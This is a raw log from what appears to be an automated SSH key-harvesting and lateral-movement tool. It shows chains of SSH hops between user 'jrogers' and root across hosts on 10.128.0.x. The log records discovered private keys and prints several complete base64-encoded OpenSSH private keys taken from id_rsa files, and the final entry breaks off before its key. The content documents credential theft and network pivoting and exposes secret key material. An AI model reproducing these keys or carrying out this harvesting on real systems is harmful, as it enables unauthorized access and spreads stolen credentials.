jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29: Discovered usable private key [3072 MD5:88:56:95:eb:90:b5:8a:1c:00:65:3f:da:75:9c:1d:71 root@instance-7 (RSA)] in [/root/.ssh/id_rsa]\n[1704020323]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29: EXTERNAL_MSG: KEY[/root/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF2bUlXTjZjc3c4RzhDQXFHcmhiUmhJbEF1YzRSQUQrbFRRUUR5aWVPazB4eUY3c3pNR1c4ClFpU3RTU1BqaW1wKzhub1ZmL3RuUG4wTWp5MEJtSCtyU3kyYThKeDZCSzE0cG0vT2MxbUtWNEFwRmpvZ1BFNDBXbmNtL3EKTjU3UzM1eUNxQ3o3Vkw0Y0xOMHNqN3N3ME9KR3p5NlNxVW9zckY5QnVxL0t4bjRCeUlzRGErRm0vSVdpRDZiczczTGhMRAp4UFpXNDd0N2xmYWczNTNCTWNBTXJ4U0pkM2lxS3UwamNYa29vdUwzUzNUSlNJUHBneDBnelBaSkNhSDVBOTd0Z1dIbERDClp6ZVlFNFdGVU9KQ0VzcXlwVnRRSDZkN2ZWcGgxaHVCd1Z5VzRTVXpxUStSNjVHWWRFYmFVdks5V1dueHlUc0ZMcERYMGEKcjNmbTUzUkpqRm5pM1h3eW8zUS85ODhxT2Z3cUVLODJDKzE0a0Z2UGdYUE5CQTJZQzhJdndVR1RSUFlrRkhVdnlvQmdpbApISzJRa1ZCUFA4SnVaZ01kNWFXcmFWV2lWdHBmempvMWhMa3NCT0lwemx5cXJmQVBnZVJINmRSeExEdEtLTU5JZVFTWnRECi9XbDFueDg0bFJtQnBuS29RVEtidnQ0dnNpMGpFQ0NrV1BzcTFkejNBQUFGaUNoOTViTW9mZVd6QUFBQUIzTnphQzF5YzIKRUFBQUdCQUw1aUZqZW5MTVBCdkFnS2hxNFcwWVNKUUxuT0VRQS9wVTBFQThvbmpwTk1jaGU3TXpCbHZFSWtyVWtqNDRwcQpmdko2RlgvN1p6NTlESTh0QVpoL3Ewc3RtdkNjZWdTdGVLWnZ6bk5aaWxlQUtSWTZJRHhPTkZwM0p2NmplZTB0K2NncWdzCisxUytIQ3pkTEkrN01ORGlSczh1a3FsS0xLeGZRYnF2eXNaK0FjaUxBMnZoWnZ5Rm9nK203Tzl5NFN3OFQyVnVPN2U1WDIKb04rZHdUSEFESzhVaVhkNHFpcnRJM0Y1S0tMaTkwdDB5VWlENllNZElNejJTUW1oK1FQZTdZRmg1UXdtYzNtQk9GaFZEaQpRaExLc3FWYlVCK25lMzFhWWRZYmdjRmNsdUVsTTZrUGtldVJtSFJHMmxMeXZWbHA4Y2s3QlM2UTE5R3E5MzV1ZDBTWXhaCjR0MThNcU4wUC9mUEtqbjhLaEN2Tmd2dGVKQmJ6NEZ6elFRTm1BdkNMOEZCazBUMkpCUjFMOHFBWUlwUnl0a0pGUVR6L0MKYm1ZREhlV2xxMmxWb2xiYVg4NDZOWVM1TEFUaUtjNWNxcTN3RDRIa1IrblVjU3c3U2lqRFNIa0VtYlEvMXBkWjhmT0pVWgpnYVp5cUVFeW03N2VMN0l0SXhBZ3BGajdLdFhjOXdBQUFBTUJBQUVBQUFHQkFLak1tUHhSS2h5SzJtZWF4WnozT0Y4MXZvCkMvbDAxTUlRanZCVmtveDM0TWFxQmw1MVlDN2U4TFMrVXNmK1BLMXJHdzB2MDliMlgxUTd4eVlCYlJJNVF0WkZIdnV6UUkKaG8relZDM3I5di9yN3dINUdYbStzU2FBdkw5TFBLQ3hnZVVhNUE2N3BRTVBVS1NTZExCbFkrT2lBYUlBa2ZiZ3FMRHVFeQpXaXl4cm0wYjdEV3JqVDlhVUwxbCtHKzV3TElTNnlaNG5WUWhkTnE0ZDQvTUZha1NSdXBnK2FtZTRqZ2Focmp6OFUwOFJBClVQTU5tbTRZMW10RDlyQW12MzNTR2VUbTV1Skozdm9Ya3plVHVqUW9NYkh3SHg1TVpqQkJwcW9VR3ZLL3RUUjdjT3VYMzIKd1VwdXQzTFNvZWNMV1ZhN21pTkFHY1JUcnB2aEhYTXhPMExXVHdYa0h2Q0VTemVlSUlTOVBaaDQ1bUY2Wms5ZThhZzVlNQpHSXgzZFljSFZEaW81d1VSam12M21RWDRrVHBoOGQ5WVhzZS9sdHhsZlFWVDY5bW9MYmszUDZJR01OQU9aMWhRb2FmVlN1CllNdGE4V1JQY2d1RkFlT3dtUGFTOXc0VGVLSXpjTG12VHJDZDY2dU5rTXRNWjZORWloOXBTZ2lEMUJDU3Z5T0R6MTZRQUEKQU1FQXZLcnVUY0FlenFPUjNZMXhHZTBiR29xRFU4QUhUTjBtYWVMa1RSaHZqalc0MElndXkvQ2hleTRSNnd0a1FQN3pSSQoyQzAyemJMTkh3cU5lOGJDRjdFNWVyRFJuZStsaHB1bm9CQUxnZ3Yya0ZvNnhhanVpcW1VVlJTaHVjSlR1bnhmK251b21jCnVsQ2VNL0dOZUlLbkFwdEdFL3MvaU5RN3ZUdnA3NW9BemNRWVo3NVJETWt5OUlxZ1NQb1pLd3dsbFpHYkd0K21TaS9UUi8KZHVuZkVrcGs3TVpRU3h2c0RTSjFJbnpZOHFxMUtQV1BtbW03czNZbS9Id1NxUUxicUdBQUFBd1FEcFdCZUJ2WTZtYVovOQpycXZ3Y1RNakxqSnJBZEZWR2ZQWmtBQy9BVDJwOTBBNEZJZTNCcDhGU1dWTFU2cG1aNzdrSjVJSUZCdGxXZjJnNmNFcmExCjYrYVREaUt5N1NsZWxNNTdaQVFyS1BPUEtDcHdTcXZGcTVaNjEwcjhzWkg5STE1c29BYkhQM1hLb0pPS09WUTFtVDZ5bXEKOTQzZUg2QU9KZGxsNlI2Qldwc2o3aFUvbURvMW03YmZWdkd4R2xIU1ZmdTArZUtEUTBsczU5YW5BQnEzbWFBbTNYQmUrTwowMy9xMTQ0UUxkR2grbFlwV2hsOHRrbG51Vll1QjhhVjBBQUFEQkFORGVMSzRmaG03d3JiUUtoNTJGMy9YSzR2eU5HSVRBCjdmQVZ3R3dscVF3clBFQm9mLzIycHlnaUFlWGFOK2ZNRG5ZdU56TTRoOGNZakgyK2grRkVGL3JKV2c1M2RCVU5QUnFLK28KNEJINGlnaTNZQ3pXSnlWYTVJemtPakxCWURLbVBsbm5MK09GU0NtaVYxUXM5MlRPMG0vRk4xcXVra0cvSVMwdEM4MlV0SwpqbkdYR2NCNjBWd002Um15ZlA3ZldSWUlSWFRGNTYrT0l2VFg5SUt0Zlk5ME52MnJpTU1GR0I5VzA3aUhyVU5iYzdHNmNwCndFalFUcnJVQlVyUVcyWXdBQUFBOXliMjkwUUdsdWMzUmhibU5sTFRjQkFnPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020323]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29: EXTERNAL_MSG: INFO: Beginning with 12 dests and 2 keys\n[1704020324]      jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25\n[1704020324]      jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)\n[1704020324]      jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27\n[1704020324]      jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)\n[1704020325]      jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27: Discovered usable private key [3072 MD5:5f:15:03:e3:c6:5e:7d:db:2d:b6:ea:a1:56:91:a8:ee jrogers@instance-5 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020325]      jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUEyLzVwbE1pVm4yaWVlaEVrUVFZSDBXTGo4anVpTTZiZmR3TDYzVEpucGdlU0dEcEZXYUxWCnJxdktSSjhZNEhRdTVJTXRHcFkvWG1XSVNOT2ZIOVpUcU1majZHdVRSK0dRcU01NzFSaTJ1RmJZY0t6SUhmK29PODNEWVUKeUVBdjZXSm1Xd3EwcndQcUxPUXpWRWRNQVVXRTVsNUpBalpSZFd5RXBaUkFqTlRubFZlbkc2QmVQZGgwZlZTRkxlMnVReApPSGdxOE9lRkdQL2gxS212REpocHo5YlZtc1ExM3dUSDN0ajh0RTVwK1RqRjFNMm52LzZhZlBLVlIrenBwZ1lUWkFnMVlLCmI3bDQ4UzhDYVpTMkZiRmJIL2FwRjZ3WHZYOENWbWlqTVJ6amQ1c0hvdi9tT29SM25WN0lIbVhBTWw5Sy9wWHRVY2FPQmwKYTJFZGpqblI3Z09CZFZBbXBvdEE0WG8yc3lnYnNHbVQzd29FOUJaSHVzSGZYL3VZemtmYlE5V1F1U1FDNnBkVXNwTG5IMApCM21pdS9sT0FIZ3ltZHg4VThXK1paQlpObW5PK3NFK0pTeGJwKzhET2YxT0w2ZXJLYUpuZGszVnZ6QlNhVmh0dTFwZnFrClYzUnoxUTFCS2ZqeWx6eDJodSs0VkRGUE1CRWpVTmk5bmI3eHE1T2pBQUFGa0t6aVd2MnM0bHI5QUFBQUIzTnphQzF5YzIKRUFBQUdCQU52K2FaVElsWjlvbm5vUkpFRUdCOUZpNC9JN29qT20zM2NDK3QweVo2WUhraGc2UlZtaTFhNnJ5a1NmR09CMApMdVNETFJxV1AxNWxpRWpUbngvV1U2akg0K2hyazBmaGtLak9lOVVZdHJoVzJIQ3N5QjMvcUR2TncyRk1oQUwrbGlabHNLCnRLOEQ2aXprTTFSSFRBRkZoT1plU1FJMlVYVnNoS1dVUUl6VTU1VlhweHVnWGozWWRIMVVoUzN0cmtNVGg0S3ZEbmhSai8KNGRTcHJ3eVlhYy9XMVpyRU5kOEV4OTdZL0xST2FmazR4ZFROcDcvK21uenlsVWZzNmFZR0UyUUlOV0NtKzVlUEV2QW1tVQp0aFd4V3gvMnFSZXNGNzEvQWxab296RWM0M2ViQjZMLzVqcUVkNTFleUI1bHdESmZTdjZWN1ZIR2pnWld0aEhZNDUwZTRECmdYVlFKcWFMUU9GNk5yTW9HN0Jwazk4S0JQUVdSN3JCMzEvN21NNUgyMFBWa0xra0F1cVhWTEtTNXg5QWQ1b3J2NVRnQjQKTXBuY2ZGUEZ2bVdRV1RacHp2ckJQaVVzVzZmdkF6bjlUaStucXltaVozWk4xYjh3VW1sWWJidGFYNnBGZDBjOVVOUVNuNAo4cGM4ZG9idnVGUXhUekFSSTFEWXZaMis4YXVUb3dBQUFBTUJBQUVBQUFHQkFOcEQyb0R4V2ZHa25NZERScEwwNXNESnVwCnJVcTZOUGh4ck83QktXTmR1Mld5NktjYy96RE1xV1NzSTJqem55UzZ3UXNhbFZORjMxb25lTzdxdHB1K3NURjMyN2JZNjkKcndhc2hwUHdSeWt4a09DSnJLcUd3bVZEU3Z1NExLbkQ2VGtEWDNzemlKUzhkcVNicnVXZXhSQ3dCOHZ6YmdxWVUxTzQ0RQpQdDc3UlNFWXJBVnU0TkcvZGlQNnZYL0o5MEU1bVJNQmwvdXNBSThBaE1xZzUzRVZSU00rK3ZpRHRTeFBMR21rSlNJalpRCks0ZHMyMmhUdFBjT3Z5bHpWb1dRTThuM2RsSmlKRVRhWmkrbU1JSi9NWUoxUXNuVEFKSjJBVFVseGJGQzVqOVlxTXNGT0YKRnA3cmYvOXZJeDJQYkhjaExxbWFFUDY0Zmx2VjhESmFaTmZ1cHVqNWxaR3RIYTk4dnRVK3JxSTQrWnVRUWlUNnI2WGluVApGZ2xYUXFQd2YzdjB6S2ZQTW5TUU53ekVKUG5QZmNCWWRsVU9ST3lEeXR2VG9Hb2hsNFRmMThJWlZpdFhHZTl6S3gvWGpSCkViNG9nb2RtNkVvb3lKbUNWUlFPSlg4NGlad0laNDc0WjhqTmxYYk5sdVZKQzNPV2VyNFJ1U0tmM1I5aTdZRWV3aFVRQUEKQU1FQXNUM2VpVmIvZk9HcGJ4VlJ4SEhGZGtMV2I3aWxmQTRGbnpSNkxFREhodGV2bVFlc3lLTkZJaUhmTEphQW1jN0ZqTwpKQUJkNUhUemFyWkpnUzB0TVNNY3M3bE14NGx6Q25oTVNiYnJBSDhSU0ZYVU8wK0hnUmsvMHJsV2ROMnN3OWpzL0NkN3RLClorTERLMTZKNE9DK1NDUUZpRWtTa2N2c1JabGNvWmFIcjdzNytzSWxidVpSNlZuL2MrNDloN3dmakhtRWZaMkxJV1gxYTQKL01ISlY2K3h2cnR1S1NhRld3cWJBdzBpSmZmZFR1NjFQTjI0aHhEYWdsM0JHR1Q3Ky9BQUFBd1FEdnAxUXBKTXVLSUUrRwpxMzRkRFhQQXRiYWNWQkFxTGJVSzRjTkx5cDV1ZGVGRm5hczdndWpzYkU0Zk5McXBEWExvNjQ1a2dwR3NuRG1IRGxaeGI3CmVwTlBZNEJZNmI0ZU05VGZxUTliNy9uUnJiWDk5Vm1YajJLQlBMMjluMFZ2SmhHWXowUnRJMklpS001T3h1WFFOVWFvcGcKRzNEVWZDOGVHSUhReWxOSGs0bC80Y0h2UUttbHY1aU1iREIrRVVhZUVUczd6ZnNONEc5ZTZFZnJOSlphait6TC92K0JJOApiNkJEdElZUm03cnYrMHpVOEJWZUdkQmd5MWZpQktxeWNBQUFEQkFPci96QUVTYlFEUXd5TGcrWTRnakRaaUVlejNVWE5kClpkNlZQa0NhUStJb2d1b0J5a0hIU2h1MXFuQ3diZFVkM3RsYWRkQ0xHN2VMYTYya2VIbHpBQ3A0TDlIVUlBS3ptSWVEa2EKT2lNTDdUV2pYMXpiaTNiMWJPR0xxWnM3eHNnWjd4bnNtQXBxTjhjeGtiaXU2S3hxbFc4U3FqcHBIS3VCZDh1ZXdhdzVDcAplUVltMWVsVlZKZTBMZEl3Y1VRSEJVWU1DSHdrY2NSSTQxRnFsbElNZ1BqNzYvWjYzelVWZ1VBL0pwRmp4S3pIdjV5Rzk1CndSZzFPWmlpZWoxV3JSSlFBQUFCSnFjbTluWlhKelFHbHVjM1JoYm1ObExUVUJBZ01FQlFZSAotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K\n[1704020325]      jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27: EXTERNAL_MSG: INFO: Beginning with 12 dests and 1 keys\n[1704020326]       jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29\n[1704020326]       jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020326]       jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28\n[1704020326]       jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)\n[1704020327]       jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28: Discovered usable private key [3072 MD5:b6:30:3a:99:e8:36:fe:81:33:0c:b2:82:6a:44:9a:55 jrogers@instance-6 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020327]       jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF3OU5sODBtQ04za1VuNVBRazhoY3hFY0xVQjJ1R0IvZVVHSTNxVnlPeEVwN3VKNC9uTlVxCjRmYmlDQlQ2SlExUFExRUtCM1JHNEtqSHpobnJreDcxR1J4YW45ZHBVN3QwRkZxbVVnajE1dVBqVy9Yd1hmMlJkUHFETVgKQm1STUdid3lnRUpibUpvblN2aGFBUjk5TTRONkZnTGJGb2hJYkJZcERRZkRublhpUDFxcHpVa1crMklaVTFaNFN4YWplNApXak1FREtCL0Z0b3gxbVVNQXlHUUx6WVovL1BORWtnY21ZakZYL0JVZUZqSkhHYzRTb0lsbThBVFpYcHYzZEVqNEt0VktGCkFEdHUySUlSbFlmcEJJeElmVjFybnJQSUtUdG1yME52NHlkSWhpTWFuVzNsalZ3c05oOFlwUGRGd1krWEN5QVdLd2ovaGkKbDVRTzlQQm93SmE1a0ttV0x5V2FYanc3Z3FacXVKbVNhWWVnYldsV0w3ejdrQ0ZNbUdkZlpwWkgrVXlXejhhZldjZlhkRQo3V1RPSUc3Qm9iTnZGczhPNVBmMllIRkhrZXhhNkVqS2pSOE9Jc0xJZGU0WnJmSVZGOVdYekdhUi9Xd0FFams3VWdhSGVuCmRmMllkWGFOWEQzT1hvL3AyQjk5M2Z1dFY1V0IzVkZuQWhLaGo0Zi9BQUFGaUJSbUJIa1VaZ1I1QUFBQUIzTnphQzF5YzIKRUFBQUdCQU1QVFpmTkpnamQ1RkorVDBKUElYTVJIQzFBZHJoZ2YzbEJpTjZsY2pzUktlN2llUDV6Vkt1SDI0Z2dVK2lVTgpUME5SQ2dkMFJ1Q294ODRaNjVNZTlSa2NXcC9YYVZPN2RCUmFwbElJOWViajQxdjE4RjM5a1hUNmd6Rndaa1RCbThNb0JDClc1aWFKMHI0V2dFZmZUT0RlaFlDMnhhSVNHd1dLUTBIdzU1MTRqOWFxYzFKRnZ0aUdWTldlRXNXbzN1Rm96QkF5Z2Z4YmEKTWRabERBTWhrQzgyR2YvenpSSklISm1JeFYvd1ZIaFl5UnhuT0VxQ0padkFFMlY2YjkzUkkrQ3JWU2hRQTdidGlDRVpXSAo2UVNNU0gxZGE1Nnp5Q2s3WnE5RGIrTW5TSVlqR3AxdDVZMWNMRFlmR0tUM1JjR1Bsd3NnRmlzSS80WXBlVUR2VHdhTUNXCnVaQ3BsaThsbWw0OE80S21hcmlaa21tSG9HMXBWaSs4KzVBaFRKaG5YMmFXUi9sTWxzL0duMW5IMTNSTzFremlCdXdhR3oKYnhiUER1VDM5bUJ4UjVIc1d1aEl5bzBmRGlMQ3lIWHVHYTN5RlJmVmw4eG1rZjFzQUJJNU8xSUdoM3AzWDltSFYyalZ3OQp6bDZQNmRnZmZkMzdyVmVWZ2QxUlp3SVNvWStIL3dBQUFBTUJBQUVBQUFHQUJyTDZyK0g1NUcvdDlxK1YyUmhucEFkU0tjCkY2TFRVWjQrSVlTV0R6T1YvYTc2dnFQVEZGc0VsRDNrYnBiODhPd1J6S25RcXJTaEE4Rlo3cFlqVVM2WE1BM3FyOTNYRnkKUFNnRXZKVzE0OW96OHZkczY2bzdDYWR3U1lhdzJQVk9vTlNEbjg3REdKMnBTNGI0Vm1RUmJrWEZCb3NsS2pONTlpZENHcAozWWZtMzRmNGV4OWUrK2FWT3phZ0V1R0pZalptS01adW91cnRkMEVRT1A3Nk44VFVFcWpva0dvUE42bHY0STBvbGtPbUcvCkw0dVFiMndZWVVXbTVEZldEOTZScmtlMG1BeklJczJkMmI4OWhuekdSVGxvaWZ2VlEwTUdxcy90NzB0NWQwUjFSZGpZL1QKalZLejFMQk5sUXU1REwwSy9zdHpGWkxySXM0NjhZVEs2R21HcWNzQ0F6eG1TMFp4amREYmx6b0dWejZIRURDQW9mWlBYcApqcUYwZXZOWS8yTDZjVzdpWEJPZFNyZ0R4dWdmWG5ZOVlPZXc1NXZ0L3U2a1h0V2tOUHh3VXc2OWljZHBBUzFZOUxUMVJZCjVhcWpONEd0UUNoQW1DeVNMejBxQWFUL2hsV01VdVlnMFVrZmFjTm9EU0xSWlVMSE5sQnRhSVNpWXUwSDZtVFdUaEFBQUEKd0QxR3kwU24xMGhNcjQvaFdxWjRoVFhNS2pUaTR2VmtsR1Z4QmxXdndhQjhhTE5pU25NRGgrZTI4N21VWXpkYStZeks1MAprL2JoakJOLzk2c25KTHN5SVQ1NVpiWDczYVJZdUR4ZHZyTXgzbEZJdGppMldScWFScGE1dWJ6V2VZYnFlU251YU5SMVpMCk5yZENOQkxjdGZ0UC9IZ3AveXQ0R1RpNW0ydGFhU0JnRFpsa3NDakN4ZTUyNVFQcGhGREp2eWRjQi9hWHZIVGhrdGQ0aFQKc1NGWDRUUm8xS2gxZDBCY3hrVGxzN3d4QUN2OVFMTHlyaEpyUDB1SWRsekl4cmhnQUFBTUVBOE42R2ZDUERuWnF6cUhYcwoyN082RmVKVEV6OWR2N0VOQlFYeHQ5US9UbHcvNnNXdTIwcmw4TXJhV1lwMXBmZ1RKdFVleU9DRnNkZTlpaDNhdktQRU1oCjJJTnkvbm51bEdjUHZJR0pUajlFSEYxYzJYdHBVNHVJbGQzVmIrUGZORzdvdUlSQUFpT1hjQ1FkYUQwNzQ4ZTd1SkJRNDQKVkhqNTBKUWRkV3d2WVU5QkxMMGNQSEVkMmFaTnJ4V0hkRFdYWW9QaThOd3dCZjRVNUt0WG45b0hsYzFXSjVKVWpzV21WWgpaajJob04yQzRNYnBOdGt1ZURWVURJTTN4Z3ZWK25BQUFBd1FEUUlJUzFtM0d6dW04bUVyZnhLRW54bUVyaUNaakg2eHlGClFHSzZZT1pHbS9qb1ZWVERscTh2RjQ3aW95NXVFc3RyYWxEZDF0bFYzWTFSaEYxYUFPaEdLK0RoUUpueFBMR1VnQ1h1UEUKNG1NSHcwS2Y2THc0Skh4OFIxZU9GZ0xxMkNVajlSbEMrOUl1ejc3c0lOUjMzanNWdUVSUC8zblFpYjA0bkt0MzgvL2hrSAp6dHNmZDQ2U1NLUjZmRmxQU3ppY0UzTGQvci94Mjhobno2S3FqdkdKRE5KdDM1bmE0STl4S3JVUkJFaDhIZzhsN0JPcXNqClJaTWhTUk41NDMzK2tBQUFBU2FuSnZaMlZ5YzBCcGJuTjBZVzVqWlMwMkFRPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020327]       jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28: Discovered usable private key [3072 MD5:fa:24:e5:39:6e:ca:01:bd:9d:ba:4f:dc:39:32:a1:8c root@instance-6 (RSA)] in [/root/.ssh/id_rsa]\n[1704020327]       jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28: EXTERNAL_MSG: KEY[/root/.ssh/id_rsa]: 